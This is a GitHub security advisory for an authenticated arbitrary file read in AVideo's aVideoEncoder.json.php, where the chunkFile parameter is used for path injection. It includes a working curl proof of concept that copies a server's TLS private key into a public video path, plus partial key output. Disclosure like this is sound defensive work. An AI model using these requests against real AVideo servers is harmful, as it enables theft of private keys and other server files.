# [H] AVideo has an authenticated arbitrary local file read via `chunkFile` path injection in `aVideoEncoder.json.php`

## Summary
Severity: High
Advisory: GHSA-4jw9-5hrc-m4j6
CVE: CVE-2026-33354
CWE: CWE-73
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-4jw9-5hrc-m4j6
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary
`POST /objects/aVideoEncoder.json.php` accepts a requester-controlled `chunkFile` parameter intended for staged upload chunks. Instead of restricting that path to trusted server-generated chunk locations, the endpoint accepts arbitrary local filesystem paths that pass `isValidURLOrPath()`. That helper allows files under broad server directories including `/var/www/`, the application root, cache, tmp, and `videos`, only rejecting `.php` files.

For an authenticated uploader editing their own video, this becomes an arbitrary local file read. The endpoint copies the attacker-chosen local file into the attacker's public video storage path, after which it can be downloaded over HTTP.

I confirmed this locally by creating an attacker-owned video, then calling `aVideoEncoder.json.php` with `videos_id=<own video>`, `format=mp4`, and `chunkFile=/var/www/html/AVideo/.compose/letsencrypt/live/localhost/privkey.pem`. The resulting public video URL returned the local TLS private key and began with `-----BEGIN PRIVATE KEY-----`.

## Affected Versions / Commit
Tested on local Docker deployment from commit `db12d4c0141d40bfabd1e82577e8c4a3d044cd84`. The application reported version `26.0`.

## Preconditions
- Authenticated account with upload permission.
- Attacker owns at least one editable video record.
- Target local file is readable by the web application user.

## Steps to Reproduce
1. Log in as an upload-capable low-privileged user.
2. Create any attacker-owned video via the normal upload endpoint to obtain `videos_id` and `filename`.
3. Send a POST request to `aVideoEncoder.json.php` with the attacker's own `videos_id`, an allowed `format`, and a server-local `chunkFile` path.
4. Download the resulting media object from `/videos/<filename>/<filename>.mp4`.

## Proof of Concept
The included `poc.py` automates the exploit against the local instance.

Manual reproduction:

```bash
# 1. Login as low-priv uploader
curl -s -c attacker.cookies \
  -d 'user=attacker&pass=UserPass123!' \
  http://127.0.0.1/objects/login.json.php >/dev/null

# 2. Create an attacker-owned video
printf 'x' > poc.mp4
curl -s -b attacker.cookies \
  -F 'upl=@poc.mp4;type=video/mp4' \
  http://127.0.0.1/view/mini-upload-form/upload.php

# Example response:
# {"error":false,"title":"poc","filename":"poc_69bb86db62c308.68438735","videos_id":4,...}

# 3. Copy a local file into the attacker's public video path
curl -s -b attacker.cookies \
  -d 'videos_id=4&format=mp4&title=poc&description=test&chunkFile=/var/www/html/AVideo/.compose/letsencrypt/live/localhost/privkey.pem' \
  http://127.0.0.1/objects/aVideoEncoder.json.php

# 4. Retrieve the copied file over HTTP
curl -s \
  http://127.0.0.1/videos/poc_69bb86db62c308.68438735/poc_69bb86db62c308.68438735.mp4 | head
```

## Observed Result
The final GET returned the contents of the local TLS private key:

```text
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQ...
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-4jw9-5hrc-m4j6
- https://nvd.nist.gov/vuln/detail/CVE-2026-33354
- https://github.com/WWBN/AVideo/commit/59bbd601a3f65a5b18c1d9e4eb11471c0a59214f
- https://github.com/WWBN/AVideo
